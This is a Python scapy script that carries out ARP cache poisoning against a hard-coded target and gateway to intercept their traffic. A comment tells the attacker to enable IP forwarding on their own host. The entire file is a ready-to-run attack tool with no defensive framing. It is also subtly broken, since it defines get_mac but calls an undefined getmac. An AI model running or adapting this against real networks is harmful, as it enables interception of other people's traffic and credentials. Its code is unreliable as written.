from scapy.all import *
from time import sleep
# This script can be used to manipulated the arp tables of target machine and gateway's
# echo 1 > /proc/sys/net/ipv4/ip_forward run this on attacker host so that it will attacker host to send packets from target to gateway router

def get_mac(ip_address):
    arp_request = ARP(pdst=ip_address)
    broadcast_pkt = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_brdcst_pkt = broadcast_pkt / arp_request
    response_list = srp(arp_brdcst_pkt, timeout = 5, verbose = False)[0]
    return response_list[0][1].hwsrc
  

def spoof_arp(target_ip, spoof_ip):
    packet = ARP(op = 2, pdst=target_ip, hwdst = getmac(target_ip), psrc = spoof_ip)
    send(packet, verbose = False)
    
def restore_original_arp(src_ip, dst_ip):
    dst_mac = getmac(dst_ip)
    src_mac = getmac(src_ip)
    packet = ARP(op = 2, pdst = dst_ip, hwdst = dst_mac, hwsrc = src_mac, psrc = src_ip)
    send(packet, verbose = False)
    
    
def poison_arp_cache(src_ip, dst_ip):
    try:
      no_of_pkts_sent = 0
      while True:
        spoof_arp(src_ip, dst_ip)
        spoof_arp(dst_ip, src_ip)
        no_of_pkts_sent = no_of_pkts_sent + 2
        print("Total Packets Sent " + str(no_of_pkts_sent) + "\n")
        sleep(2)
        
    except KeyboardInterrupt:
        print("Ctrl + C pressed.............Exiting")
        restore_original_arp(src_ip, dst_ip)
        restore_original_arp(dst_ip, src_ip)
        print("\n Arp Spoof Program Stopped and Cache Restored")
        

   
  
if __name__ == "__main__":
    target_ip = "10.0.4.10"
    gateway_ip = "10.0.0.1"
    poison_arp_cache(target_ip, gateway_ip)
    
  
